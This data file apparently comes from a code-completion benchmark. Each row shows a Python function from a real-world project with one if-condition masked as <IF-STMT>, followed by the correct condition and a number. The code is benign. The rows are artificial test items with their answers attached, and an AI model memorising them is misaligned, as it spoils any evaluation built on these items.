3987,"def get_tokens_unprocessed(self, text):<tab>from pygments.lexers._asy_builtins import ASYFUNCNAME, ASYVARNAME<tab>for index, token, value in RegexLexer.get_tokens_unprocessed(self, text):<tab><tab>if token is Name and value in ASYFUNCNAME:<tab><tab><tab>token = Name.Function<tab><tab><IF-STMT><tab><tab><tab>token = Name.Variable<tab><tab>yield index, token, value",elif token is Name and value in ASYVARNAME :,113
3988,"def write_family_handle(self, family, index=1):<tab>sp = ""  "" * index<tab>self.write_primary_tag(""family"", family, index)<tab>if family:<tab><tab>rel = escxml(family.get_relationship().xml_str())<tab><tab><IF-STMT><tab><tab><tab>self.g.write('  %s<rel type=""%s""/>\n' % (sp, rel))","if rel != """" :",99
3989,"def pop1_bytes(self) -> bytes:<tab>#<tab># Note: This function is optimized for speed over readability.<tab># Knowing the popped type means that we can pop *very* quickly<tab># when the popped type matches the pushed type.<tab>#<tab>if not self.values:<tab><tab>raise InsufficientStack(""Wanted 1 stack item as bytes, had none"")<tab>else:<tab><tab>item_type, popped = self._pop_typed()<tab><tab>if item_type is int:<tab><tab><tab>return int_to_big_endian(popped)  # type: ignore<tab><tab><IF-STMT><tab><tab><tab>return popped  # type: ignore<tab><tab>else:<tab><tab><tab>raise _busted_type(item_type, popped)",elif item_type is bytes :,182
3990,"def setDefaultComponents(self):<tab>if self._componentTypeLen == self._componentValuesSet:<tab><tab>return<tab>idx = self._componentTypeLen<tab>while idx:<tab><tab>idx = idx - 1<tab><tab><IF-STMT><tab><tab><tab>if self.getComponentByPosition(idx) is None:<tab><tab><tab><tab>self.setComponentByPosition(idx)<tab><tab>elif not self._componentType[idx].isOptional:<tab><tab><tab>if self.getComponentByPosition(idx) is None:<tab><tab><tab><tab>raise error.PyAsn1Error(<tab><tab><tab><tab><tab>""Uninitialized component #%s at %r"" % (idx, self)<tab><tab><tab><tab>)",if self . _componentType [ idx ] . isDefaulted :,168
3991,"def _cloneComponentValues(self, myClone, cloneValueFlag):<tab>idx = 0<tab>l = len(self._componentValues)<tab>while idx < l:<tab><tab>c = self._componentValues[idx]<tab><tab><IF-STMT><tab><tab><tab>if isinstance(c, base.AbstractConstructedAsn1Item):<tab><tab><tab><tab>myClone.setComponentByPosition(<tab><tab><tab><tab><tab>idx, c.clone(cloneValueFlag=cloneValueFlag)<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>myClone.setComponentByPosition(idx, c.clone())<tab><tab>idx = idx + 1",if c is not None :,154
3992,"def endElement(self, tag):<tab>""""""Handle the end of an element.""""""<tab>if tag == ""author"":<tab><tab>developer = self.text.strip()<tab><tab><IF-STMT><tab><tab><tab>self.author_list.append(developer)<tab><tab>elif self.title == ""contributor"" and developer not in self.contributor_list:<tab><tab><tab>self.contributor_list.append(developer)","if self . title == ""author"" and developer not in self . author_list :",113
3993,"def has_safe_repr(value):<tab>""""""Does the node have a safe representation?""""""<tab>if value is None or value is NotImplemented or value is Ellipsis:<tab><tab>return True<tab>if isinstance(value, (bool, int, long, float, complex, basestring, xrange, Markup)):<tab><tab>return True<tab>if isinstance(value, (tuple, list, set, frozenset)):<tab><tab>for item in value:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return False<tab><tab>return True<tab>elif isinstance(value, dict):<tab><tab>for key, value in value.iteritems():<tab><tab><tab>if not has_safe_repr(key):<tab><tab><tab><tab>return False<tab><tab><tab>if not has_safe_repr(value):<tab><tab><tab><tab>return False<tab><tab>return True<tab>return False",if not has_safe_repr ( item ) :,192
3994,"def test_all_wizards(self):<tab>mod = ""w3af.core.controllers.wizard.wizards.%s""<tab>w3af_core = w3afCore()<tab>for filename in os.listdir(""w3af/core/controllers/wizard/wizards/""):<tab><tab>wizard_id, ext = os.path.splitext(filename)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>klass = mod % wizard_id<tab><tab>wizard_inst = factory(klass, w3af_core)<tab><tab>yield self._test_wizard_correct, wizard_inst<tab><tab>wizard_inst = factory(klass, w3af_core)<tab><tab>yield self._test_wizard_fail, wizard_inst","if wizard_id in ( ""__init__"" , "".git"" ) or ext == "".pyc"" :",183
3995,"def test_bool_performance(self):<tab>class Person(Document):<tab><tab>name = StringField()<tab>Person.drop_collection()<tab>for i in range(100):<tab><tab>Person(name=""No: %s"" % i).save()<tab>with query_counter() as q:<tab><tab><IF-STMT><tab><tab><tab>pass<tab><tab>assert q == 1<tab><tab>op = q.db.system.profile.find({""ns"": {""$ne"": ""%s.system.indexes"" % q.db.name}})[<tab><tab><tab>0<tab><tab>]<tab><tab>assert op[""nreturned""] == 1",if Person . objects :,149
3996,"def validate(self) -> None:<tab>if self.query:<tab><tab><IF-STMT><tab><tab><tab>for arg_name in (""aur"", ""repo""):<tab><tab><tab><tab>if getattr(self, arg_name):<tab><tab><tab><tab><tab>raise MissingArgument(""sysupgrade"", arg_name)",if not self . sysupgrade :,74
3997,"def __new__(cls, name, parents, dct):<tab>command_handlers = {}<tab>for attr_name, attr in dct.items():<tab><tab><IF-STMT><tab><tab><tab>handles_what = attr_name[len(""handle_"") :]<tab><tab><tab>if handles_what:<tab><tab><tab><tab>command_handlers[handles_what] = attr<tab>dct[""command_handlers""] = command_handlers<tab>return super(CommandHandlerMeta, cls).__new__(cls, name, parents, dct)","if callable ( attr ) and attr_name . startswith ( ""handle_"" ) :",124
3998,"def pop_error_text(self, error_text):<tab>if error_text in self.__errors:<tab><tab>self.__errors.remove(error_text)<tab><tab><IF-STMT><tab><tab><tab>self.set_message_text(WELCOME_MESSAGE)<tab><tab>else:<tab><tab><tab>self.set_message_text(next(self.__errors.__iter__()))",if len ( self . __errors ) == 0 :,95
3999,"def run(self, edit):<tab>self.clear_phantoms()<tab>regions = self.view.sel()<tab>for region in regions:<tab><tab>region, _ = self.get_selection_from_region(<tab><tab><tab>region=region, regions_length=len(region), view=self.view<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>try:<tab><tab><tab>self.json_loads(self.view.substr(region), self.duplicate_key_hook)<tab><tab>except Exception as ex:<tab><tab><tab>self.show_exception(region=region, msg=ex)<tab><tab><tab>return<tab><tab>sublime.status_message(""JSON Valid"")",if region is None :,165
4000,"def update_leaderboard(wait_time):<tab>conn = get_connection()<tab>cursor = conn.cursor(MySQLdb.cursors.DictCursor)<tab>while True:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>log.info(""Updating leaderboard and adding some sigma"")<tab><tab><tab>cursor.execute(""call generate_leaderboard;"")<tab><tab><tab>if wait_time == 0:<tab><tab><tab><tab>break<tab><tab><tab>for s in range(wait_time):<tab><tab><tab><tab># allow for a [Ctrl]+C during the sleep cycle<tab><tab><tab><tab>time.sleep(1)<tab><tab>except KeyboardInterrupt:<tab><tab><tab>break<tab><tab>except:<tab><tab><tab># log error<tab><tab><tab>log.error(traceback.format_exc())<tab><tab><tab>break<tab>cursor.close()<tab>conn.close()",if use_log :,199
4001,"def _external_tables(self):<tab>tables = []<tab>for name, df in self.extra_options.get(""external_tables"", {}).items():<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(""External table is not an instance of pandas "" ""dataframe"")<tab><tab>schema = sch.infer(df)<tab><tab>chtypes = map(ClickhouseDataType.from_ibis, schema.types)<tab><tab>structure = list(zip(schema.names, map(str, chtypes)))<tab><tab>tables.append(dict(name=name, data=df.to_dict(""records""), structure=structure))<tab>return tables","if not isinstance ( df , pd . DataFrame ) :",152
4002,"def getmod(self, nm):<tab>mod = None<tab>for thing in self.path:<tab><tab><IF-STMT><tab><tab><tab>owner = self.shadowpath.get(thing, -1)<tab><tab><tab>if owner == -1:<tab><tab><tab><tab>owner = self.shadowpath[thing] = self.__makeOwner(thing)<tab><tab><tab>if owner:<tab><tab><tab><tab>mod = owner.getmod(nm)<tab><tab>else:<tab><tab><tab>mod = thing.getmod(nm)<tab><tab>if mod:<tab><tab><tab>break<tab>return mod","if isinstance ( thing , basestring ) :",137
4003,"def add_variant_attribute_data_to_expected_data(data, variant, attribute_ids, pk=None):<tab>for assigned_attribute in variant.attributes.all():<tab><tab>header = f""{assigned_attribute.attribute.slug} (variant attribute)""<tab><tab>if str(assigned_attribute.attribute.pk) in attribute_ids:<tab><tab><tab>value = get_attribute_value(assigned_attribute)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>data[pk][header] = value<tab><tab><tab>else:<tab><tab><tab><tab>data[header] = value<tab>return data",if pk :,136
4004,"def get_files(start_dir, includes, excludes):<tab># use os.walk to recursively dig down into the Pupil directory<tab>match_files = []<tab>for root, dirs, files in os.walk(start_dir):<tab><tab>if not re.search(excludes, root):<tab><tab><tab>files = [<tab><tab><tab><tab>f<tab><tab><tab><tab>for f in files<tab><tab><tab><tab><IF-STMT><tab><tab><tab>]<tab><tab><tab>files = [os.path.join(root, f) for f in files]<tab><tab><tab>match_files += files<tab><tab>else:<tab><tab><tab>print(""Excluding '%s'"" % root)<tab>return match_files","if re . search ( includes , f ) and not re . search ( excludes , f )",175
4005,"def findinDoc(self, tagpath, pos, end):<tab>result = None<tab>if end == -1:<tab><tab>end = self.docSize<tab>else:<tab><tab>end = min(self.docSize, end)<tab>foundat = -1<tab>for j in range(pos, end):<tab><tab>item = self.docList[j]<tab><tab><IF-STMT><tab><tab><tab>(name, argres) = item.split(b""="", 1)<tab><tab>else:<tab><tab><tab>name = item<tab><tab><tab>argres = """"<tab><tab>if isinstance(tagpath, str):<tab><tab><tab>tagpath = tagpath.encode(""utf-8"")<tab><tab>if name.endswith(tagpath):<tab><tab><tab>result = argres<tab><tab><tab>foundat = j<tab><tab><tab>break<tab>return foundat, result","if item . find ( b""="" ) >= 0 :",189
4006,"def load_classes(module, base, blacklist):<tab>classes = []<tab>for attr in dir(module):<tab><tab>attr = getattr(module, attr)<tab><tab>if inspect.isclass(attr):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if attr is not base and attr not in blacklist:<tab><tab><tab><tab><tab>classes.append(attr)<tab>return classes","if issubclass ( attr , base ) :",90
4007,"def run():<tab>try:<tab><tab>result = func()<tab>except Exception:<tab><tab>future_cell[0] = TracebackFuture()<tab><tab>future_cell[0].set_exc_info(sys.exc_info())<tab>else:<tab><tab><IF-STMT><tab><tab><tab>future_cell[0] = result<tab><tab>else:<tab><tab><tab>future_cell[0] = TracebackFuture()<tab><tab><tab>future_cell[0].set_result(result)<tab>self.add_future(future_cell[0], lambda future: self.stop())",if is_future ( result ) :,136
4008,def lastCard(self):<tab>if self._answeredIds:<tab><tab><IF-STMT><tab><tab><tab>try:<tab><tab><tab><tab>return self.mw.col.getCard(self._answeredIds[-1])<tab><tab><tab>except TypeError:<tab><tab><tab><tab># id was deleted<tab><tab><tab><tab>return,if not self . card or self . _answeredIds [ - 1 ] != self . card . id :,94
4009,"def run(self):<tab>global _cameras<tab>while 1:<tab><tab>for cam in _cameras:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>cam.pygame_buffer = cam.capture.get_image(cam.pygame_buffer)<tab><tab><tab>else:<tab><tab><tab><tab>cv.GrabFrame(cam.capture)<tab><tab><tab>cam._threadcapturetime = time.time()<tab><tab>time.sleep(0.04)  # max 25 fps, if you're lucky",if cam . pygame_camera :,120
4010,"def handle_exception(self, e, result):<tab>for k in sorted(result.thrift_spec):<tab><tab>if result.thrift_spec[k][1] == ""success"":<tab><tab><tab>continue<tab><tab>_, exc_name, exc_cls, _ = result.thrift_spec[k]<tab><tab><IF-STMT><tab><tab><tab>setattr(result, exc_name, e)<tab><tab><tab>return True<tab>return False","if isinstance ( e , exc_cls ) :",112
4011,"def for_module(cls, modname: str) -> ""ModuleAnalyzer"":<tab>if (""module"", modname) in cls.cache:<tab><tab>entry = cls.cache[""module"", modname]<tab><tab>if isinstance(entry, PycodeError):<tab><tab><tab>raise entry<tab><tab>return entry<tab>try:<tab><tab>filename, source = cls.get_module_source(modname)<tab><tab><IF-STMT><tab><tab><tab>obj = cls.for_string(source, modname, filename or ""<string>"")<tab><tab>elif filename is not None:<tab><tab><tab>obj = cls.for_file(filename, modname)<tab>except PycodeError as err:<tab><tab>cls.cache[""module"", modname] = err<tab><tab>raise<tab>cls.cache[""module"", modname] = obj<tab>return obj",if source is not None :,182
4012,"def visit_productionlist(self, node):<tab>self.new_state()<tab>names = []<tab>for production in node:<tab><tab>names.append(production[""tokenname""])<tab>maxlen = max(len(name) for name in names)<tab>for production in node:<tab><tab><IF-STMT><tab><tab><tab>self.add_text(production[""tokenname""].ljust(maxlen) + "" ::="")<tab><tab><tab>lastname = production[""tokenname""]<tab><tab>else:<tab><tab><tab>self.add_text(""%s<tab>"" % ("" "" * len(lastname)))<tab><tab>self.add_text(production.astext() + ""\n"")<tab>self.end_state(wrap=False)<tab>raise nodes.SkipNode","if production [ ""tokenname"" ] :",167
4013,"def transport_vmware_guestinfo():<tab>rpctool = ""vmware-rpctool""<tab>not_found = None<tab>if not subp.which(rpctool):<tab><tab>return not_found<tab>cmd = [rpctool, ""info-get guestinfo.ovfEnv""]<tab>try:<tab><tab>out, _err = subp.subp(cmd)<tab><tab><IF-STMT><tab><tab><tab>return out<tab><tab>LOG.debug(""cmd %s exited 0 with empty stdout: %s"", cmd, out)<tab>except subp.ProcessExecutionError as e:<tab><tab>if e.exit_code != 1:<tab><tab><tab>LOG.warning(""%s exited with code %d"", rpctool, e.exit_code)<tab><tab><tab>LOG.debug(e)<tab>return not_found",if out :,196
4014,"def MakeWidthArray(fm):<tab># Make character width array<tab>s = ""{\n\t""<tab>cw = fm[""Widths""]<tab>for i in xrange(0, 256):<tab><tab>if chr(i) == ""'"":<tab><tab><tab>s += ""'\\''""<tab><tab>elif chr(i) == ""\\"":<tab><tab><tab>s += ""'\\\\'""<tab><tab>elif i >= 32 and i <= 126:<tab><tab><tab>s += ""'"" + chr(i) + ""'""<tab><tab>else:<tab><tab><tab>s += ""chr(%d)"" % i<tab><tab>s += "":"" + fm[""Widths""][i]<tab><tab>if i < 255:<tab><tab><tab>s += "",""<tab><tab><IF-STMT><tab><tab><tab>s += ""\n\t""<tab>s += ""}""<tab>return s",if ( i + 1 ) % 22 == 0 :,192
4015,"def lookup_config_file(filename: str) -> Optional[str]:<tab>""""""Return config file PATH.""""""<tab>for path in [find_vcs_root(default=""~""), ""~""]:<tab><tab>f = os.path.expanduser(""%s/%s"" % (path, filename))<tab><tab><IF-STMT><tab><tab><tab>LOG.info(""Found config file %s"", f)<tab><tab><tab>return f<tab>return None",if os . path . isfile ( f ) :,103
4016,"def load_freq_dict(self, freq_dict_filename: str):<tab>with open(str(expand_path(freq_dict_filename)), ""r"") as fl:<tab><tab>lines = fl.readlines()<tab>pos_freq_dict = defaultdict(list)<tab>for line in lines:<tab><tab>line_split = line.strip(""\n"").split(""\t"")<tab><tab><IF-STMT><tab><tab><tab>pos_freq_dict[line_split[1]].append((line_split[0], float(line_split[2])))<tab>nouns_with_freq = pos_freq_dict[""s""]<tab>self.nouns_dict = {noun: freq for noun, freq in nouns_with_freq}","if re . match ( ""[\d]+\.[\d]+"" , line_split [ 2 ] ) :",180
4017,"def do_visual_mode(self):<tab>""""""Handle strokes in visual mode.""""""<tab>try:<tab><tab>self.n1 = self.n = 1<tab><tab>self.do_state(<tab><tab><tab>self.vis_dispatch_d,<tab><tab><tab>mode_name=""visual-line"" if self.visual_line_flag else ""visual"",<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.visual_line_helper()<tab>except Exception:<tab><tab>g.es_exception()<tab><tab>self.quit()",if self . visual_line_flag :,131
4018,"def cleanup(self):<tab>log.info("""")<tab>log.info(""Cleaning up.. "")<tab>status = self._capture_output(""status"", ""--porcelain"")<tab>status = status.split(""\n"")<tab>for line in status:<tab><tab>filepath = line.split()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>filepath = filepath[-1]<tab><tab>if filepath[-3:] != ""rej"" and filepath[-5:] != ""porig"":<tab><tab><tab>continue<tab><tab>try:<tab><tab><tab>log.info(""Removing temp file %s "" % filepath)<tab><tab><tab>os.remove(os.path.join(self.base_dir, filepath))<tab><tab>except:<tab><tab><tab>log.warn(""File removal failed, you should manually remove %s"" % filepath)<tab><tab><tab>pass",if len ( filepath ) == 0 :,195
4019,"def OnBodyRClick(self, event=None):<tab>try:<tab><tab>c = self.c<tab><tab>p = c.currentPosition()<tab><tab><IF-STMT><tab><tab><tab>c.k.showStateAndMode(w=c.frame.body.bodyCtrl)<tab><tab>g.doHook(""bodyrclick2"", c=c, p=p, v=p, event=event)<tab>except:<tab><tab>g.es_event_exception(""iconrclick"")","if not g . doHook ( ""bodyrclick1"" , c = c , p = p , v = p , event = event ) :",138
4020,"def receiver():<tab>""""""receive messages with polling""""""<tab>pull = ctx.socket(zmq.PULL)<tab>pull.connect(url)<tab>poller = Poller()<tab>poller.register(pull, zmq.POLLIN)<tab>while True:<tab><tab>events = await poller.poll()<tab><tab><IF-STMT><tab><tab><tab>print(""recving"", events)<tab><tab><tab>msg = await pull.recv_multipart()<tab><tab><tab>print(""recvd"", msg)",if pull in dict ( events ) :,120
4021,"def sched(self):<tab>for k, q in self.q.items():<tab><tab><IF-STMT><tab><tab><tab>ent = q.popleft()<tab><tab><tab>self.cur[k] = ent<tab><tab><tab>self.run_one(ent, k)",if q and k not in self . cur :,69
4022,"def eval_dummy_genomes_iznn(genomes, config):<tab>for genome_id, genome in genomes:<tab><tab>net = neat.iznn.IZNN.create(genome, config)<tab><tab><IF-STMT><tab><tab><tab>net.reset()<tab><tab><tab>genome.fitness = 0.0<tab><tab>elif genome_id <= 150:<tab><tab><tab>genome.fitness = 0.5<tab><tab>else:<tab><tab><tab>genome.fitness = 1.0",if genome_id < 10 :,129
4023,"def handle_noargs(self, **options):<tab># Inspired by Postfix's ""postconf -n"".<tab>from django.conf import settings, global_settings<tab># Because settings are imported lazily, we need to explicitly load them.<tab>settings._setup()<tab>user_settings = module_to_dict(settings._wrapped)<tab>default_settings = module_to_dict(global_settings)<tab>output = []<tab>for key in sorted(user_settings.keys()):<tab><tab>if key not in default_settings:<tab><tab><tab>output.append(""%s = %s  ###"" % (key, user_settings[key]))<tab><tab><IF-STMT><tab><tab><tab>output.append(""%s = %s"" % (key, user_settings[key]))<tab>return ""\n"".join(output)",elif user_settings [ key ] != default_settings [ key ] :,196
4024,def test_get_chat_thread(self):<tab>async with self.chat_client:<tab><tab>await self._create_thread()<tab><tab>get_thread_result = await self.chat_client.get_chat_thread(self.thread_id)<tab><tab>assert get_thread_result.id == self.thread_id<tab><tab># delete created users and chat threads<tab><tab><IF-STMT><tab><tab><tab>await self.chat_client.delete_chat_thread(self.thread_id),if not self . is_playback ( ) :,121
4025,"def consume(self):<tab>if not self.inputState.guessing:<tab><tab>c = self.LA(1)<tab><tab><IF-STMT><tab><tab><tab>self.append(c)<tab><tab>else:<tab><tab><tab># use input.LA(), not LA(), to get original case<tab><tab><tab># CharScanner.LA() would toLower it.<tab><tab><tab>c = self.inputState.input.LA(1)<tab><tab><tab>self.append(c)<tab><tab>if c and c in ""\t"":<tab><tab><tab>self.tab()<tab><tab>else:<tab><tab><tab>self.inputState.column += 1<tab>self.inputState.input.consume()",if self . caseSensitive :,159
4026,"def commandComplete(self, cmd):<tab>if self.property:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>result = self.observer.getStdout()<tab><tab>if self.strip:<tab><tab><tab>result = result.strip()<tab><tab>propname = self.property<tab><tab>self.setProperty(propname, result, ""SetPropertyFromCommand Step"")<tab><tab>self.property_changes[propname] = result<tab>else:<tab><tab>new_props = self.extract_fn(<tab><tab><tab>cmd.rc, self.observer.getStdout(), self.observer.getStderr()<tab><tab>)<tab><tab>for k, v in iteritems(new_props):<tab><tab><tab>self.setProperty(k, v, ""SetPropertyFromCommand Step"")<tab><tab>self.property_changes = new_props",if cmd . didFail ( ) :,192
4027,"def any(self, provider_name):<tab>result = authomatic.login(Webapp2Adapter(self), provider_name)<tab>if result:<tab><tab>apis = []<tab><tab>if result.user:<tab><tab><tab>result.user.update()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>apis = config.config.get(provider_name, {}).get(""_apis"", {})<tab><tab>nice_provider_name = (<tab><tab><tab>config.config.get(provider_name, {}).get(""_name"")<tab><tab><tab>or provider_name.capitalize()<tab><tab>)<tab><tab>render(<tab><tab><tab>self,<tab><tab><tab>result,<tab><tab><tab>result.popup_js(custom=dict(apis=apis, provider_name=nice_provider_name)),<tab><tab>)",if result . user . credentials :,186
4028,"def set_lock(self, lock_closed=True, device=0, timeout=0):<tab>if self.handle:<tab><tab>action = 0x02 if lock_closed else 0x01<tab><tab>reply = self.write_register(_R.receiver_pairing, action, device, timeout)<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>_log.warn(<tab><tab><tab>""%s: failed to %s the receiver lock"",<tab><tab><tab>self,<tab><tab><tab>""close"" if lock_closed else ""open"",<tab><tab>)",if reply :,129
4029,"def connect_thread(self, sleep_time=0):<tab>time.sleep(sleep_time)<tab>try:<tab><tab>while self.running and self._need_more_ip():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab><tab>self.connect_process()<tab>finally:<tab><tab>self.thread_num_lock.acquire()<tab><tab>self.thread_num -= 1<tab><tab>self.thread_num_lock.release()",if self . new_conn_pool . qsize ( ) > self . config . https_connection_pool_max :,128
4030,"def train_job(<tab>guest_party_id, host_party_id, arbiter_party_id, train_conf_path, train_dsl_path):<tab>train = TrainSBTModel()<tab>train.set_config(guest_party_id, host_party_id, arbiter_party_id, train_conf_path)<tab>train.set_dsl(train_dsl_path)<tab>status = train.submit()<tab>if status:<tab><tab>is_success = train.wait_success(timeout=600)<tab><tab><IF-STMT><tab><tab><tab>train.get_component_metrics()<tab><tab><tab>train.get_component_output_model()<tab><tab><tab>train.get_component_output_data()<tab><tab><tab>return train<tab>return False",if is_success :,188
4031,"def get_version():<tab>INIT = os.path.abspath(os.path.join(HERE, "".."", ""pyftpdlib"", ""__init__.py""))<tab>with open(INIT, ""r"") as f:<tab><tab>for line in f:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ret = eval(line.strip().split("" = "")[1])<tab><tab><tab><tab>assert ret.count(""."") == 2, ret<tab><tab><tab><tab>for num in ret.split("".""):<tab><tab><tab><tab><tab>assert num.isdigit(), ret<tab><tab><tab><tab>return ret<tab><tab>else:<tab><tab><tab>raise ValueError(""couldn't find version string"")","if line . startswith ( ""__ver__"" ) :",151
4032,"def get_terminus_panel(self, window, visible_only=False):<tab>if visible_only:<tab><tab>active_panel = window.active_panel()<tab><tab>panels = [active_panel] if active_panel else []<tab>else:<tab><tab>panels = window.panels()<tab>for panel in panels:<tab><tab>panel_name = panel.replace(""output."", """")<tab><tab>if panel_name == EXEC_PANEL:<tab><tab><tab>continue<tab><tab>panel_view = window.find_output_panel(panel_name)<tab><tab>if panel_view:<tab><tab><tab>terminal = Terminal.from_id(panel_view.id())<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return panel_view<tab>return None",if terminal :,173
4033,"def to_internal_value(self, data):<tab>site = get_current_site()<tab>pages_root = reverse(""pages-root"")<tab>ret = []<tab>for path in data:<tab><tab><IF-STMT><tab><tab><tab>path = path[len(pages_root) :]<tab><tab># strip any final slash<tab><tab>if path.endswith(""/""):<tab><tab><tab>path = path[:-1]<tab><tab>page = get_page_from_path(site, path)<tab><tab>if page:<tab><tab><tab>ret.append(page)<tab>return ret",if path . startswith ( pages_root ) :,136
4034,"def forward(self, inputs):<tab>input_dtype = inputs[0].dtype<tab>if self.comm.rank == self.root:<tab><tab># convert to float32 for communication<tab><tab><IF-STMT><tab><tab><tab>inputs = tuple([item.astype(numpy.float32) for item in inputs])<tab><tab>y = self.comm.scatter(inputs, self.root)<tab>else:<tab><tab>y = self.comm.scatter(None, self.root)<tab># convert back<tab>if numpy.float16 == input_dtype:<tab><tab>y = y.astype(input_dtype)<tab>return (y,)",if numpy . float16 == input_dtype :,152
4035,"def discover_misago_admin():<tab>for app in apps.get_app_configs():<tab><tab>module = import_module(app.name)<tab><tab>if not hasattr(module, ""admin""):<tab><tab><tab>continue<tab><tab>admin_module = import_module(""%s.admin"" % app.name)<tab><tab><IF-STMT><tab><tab><tab>extension = getattr(admin_module, ""MisagoAdminExtension"")()<tab><tab><tab>if hasattr(extension, ""register_navigation_nodes""):<tab><tab><tab><tab>extension.register_navigation_nodes(site)<tab><tab><tab>if hasattr(extension, ""register_urlpatterns""):<tab><tab><tab><tab>extension.register_urlpatterns(urlpatterns)","if hasattr ( admin_module , ""MisagoAdminExtension"" ) :",169
4036,"def overwrite_timeout(<tab>initial_node: dict, path: str, hash_: str, size_: int, rsf: bool) -> int:<tab>minutes = 10<tab>while minutes > 0:<tab><tab>time.sleep(60)<tab><tab>minutes -= 1<tab><tab>n = acd_client.get_metadata(initial_node[""id""])<tab><tab><IF-STMT><tab><tab><tab>return upload_complete(n, path, hash_, size_, rsf)<tab>logger.warning('Timeout while overwriting ""%s"".' % path)<tab>return UL_TIMEOUT","if n [ ""version"" ] > initial_node [ ""version"" ] :",138
4037,"def write(self, s, spos):<tab>if not s:<tab><tab>return<tab># Force s to be a string or unicode<tab>if not isinstance(s, basestring):<tab><tab>s = str(s)<tab>slen = self.len<tab>if spos == slen:<tab><tab>self.len = self.pos = spos + len(s)<tab><tab>return<tab>if spos > slen:<tab><tab>slen = spos<tab>newpos = spos + len(s)<tab>if spos < slen:<tab><tab>if self.buflist:<tab><tab><tab>self.buf += """".join(self.buflist)<tab><tab>self.buflist = [self.buf[:spos], s, self.buf[newpos:]]<tab><tab><IF-STMT><tab><tab><tab>slen = newpos<tab>else:<tab><tab>self.buflist.append(s)",if newpos > slen :,196
4038,"def _print_one_entry(news_entry: xml.etree.ElementTree.Element) -> None:<tab>child: xml.etree.ElementTree.Element<tab>for child in news_entry:<tab><tab>if ""title"" in child.tag:<tab><tab><tab>title = str(child.text)<tab><tab>if ""pubDate"" in child.tag:<tab><tab><tab>pub_date = str(child.text)<tab><tab><IF-STMT><tab><tab><tab>description = str(child.text)<tab>print_stdout(color_line(title, 14) + "" ("" + bold_line(pub_date) + "")"")<tab>print_stdout(format_paragraph(strip_tags(description)))<tab>print_stdout()","if ""description"" in child . tag :",169
4039,"def get_sequence_type_str(x: Sequence[Any]) -> str:<tab>container_type = type(x).__name__<tab>if not x:<tab><tab>if container_type == ""list"":<tab><tab><tab>return ""[]""<tab><tab>else:<tab><tab><tab>return container_type + ""([])""<tab>elem_type = get_type_str(x[0])<tab>if container_type == ""list"":<tab><tab><IF-STMT><tab><tab><tab>return ""["" + elem_type + ""]""<tab><tab>else:<tab><tab><tab>return ""["" + elem_type + "", ...]""<tab>else:<tab><tab>if len(x) == 1:<tab><tab><tab>return f""{container_type}([{elem_type}])""<tab><tab>else:<tab><tab><tab>return f""{container_type}([{elem_type}, ...])""",if len ( x ) == 1 :,196
4040,"def signal_notebook_switch_page(self, notebook, current_page, index):<tab>if not hasattr(self.parent, ""rpc""):<tab><tab>return<tab># previous_page = notebook.get_nth_page(self.last_page_id)<tab>self.last_page_id = index<tab>for tab in self.tabs.values():<tab><tab>if current_page != tab.box:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>tab.load_campaign_information(force=False)","if hasattr ( tab , ""load_campaign_information"" ) :",137
4041,"def format_string(self, templ, args):<tab>templ = self.to_native(templ)<tab>if isinstance(args, nodes.Arguments):<tab><tab>args = args.arguments<tab>for (i, arg) in enumerate(args):<tab><tab>arg = self.to_native(self.reduce_single(arg))<tab><tab><IF-STMT>  # Python boolean is upper case.<tab><tab><tab>arg = str(arg).lower()<tab><tab>templ = templ.replace(""@{}@"".format(i), str(arg))<tab>return templ","if isinstance ( arg , bool ) :",135
4042,"def execute_Single(self, object, smooth):<tab>if getattr(object, ""type"", """") == ""MESH"":<tab><tab>mesh = object.data<tab><tab><IF-STMT><tab><tab><tab>smoothList = [smooth] * len(mesh.polygons)<tab><tab><tab>mesh.polygons.foreach_set(""use_smooth"", smoothList)<tab><tab><tab># trigger update<tab><tab><tab>mesh.polygons[0].use_smooth = smooth<tab>return object",if len ( mesh . polygons ) > 0 :,112
4043,"def _enumerate_visible_deps(self, dep, predicate):<tab># We present the dependencies out of classpath order and instead in alphabetized internal deps,<tab># then alphabetized external deps order for ease in scanning output.<tab>dependencies = sorted(x for x in getattr(dep, ""dependencies"", []))<tab>if not self.is_internal_only:<tab><tab>dependencies.extend(<tab><tab><tab>sorted(<tab><tab><tab><tab>(x for x in getattr(dep, ""jar_dependencies"", [])),<tab><tab><tab><tab>key=lambda x: (x.org, x.name, x.rev, x.classifier),<tab><tab><tab>)<tab><tab>)<tab>for inner_dep in dependencies:<tab><tab>dep_id, internal = self._dep_id(inner_dep)<tab><tab><IF-STMT><tab><tab><tab>yield inner_dep",if predicate ( internal ) :,193
4044,"def stop_test(self):<tab>if self.master:<tab><tab>self.log.info(""Ending cloud test..."")<tab><tab>if not self._last_status:<tab><tab><tab>self.get_master_status()<tab><tab><IF-STMT><tab><tab><tab>self.master.stop()<tab><tab>else:<tab><tab><tab>self.master.terminate()","if self . _last_status [ ""progress"" ] >= 100 :",92
4045,"def run(self, workspace):<tab>""""""Run the module""""""<tab>if self.show_window:<tab><tab>m = workspace.get_measurements()<tab><tab>x = m.get_current_measurement(self.get_object(), self.x_axis.value)<tab><tab><IF-STMT><tab><tab><tab>x = x[x > self.xbounds.min]<tab><tab><tab>x = x[x < self.xbounds.max]<tab><tab>workspace.display_data.x = x<tab><tab>workspace.display_data.title = ""{} (cycle {})"".format(<tab><tab><tab>self.title.value, workspace.measurements.image_set_number<tab><tab>)",if self . wants_xbounds :,163
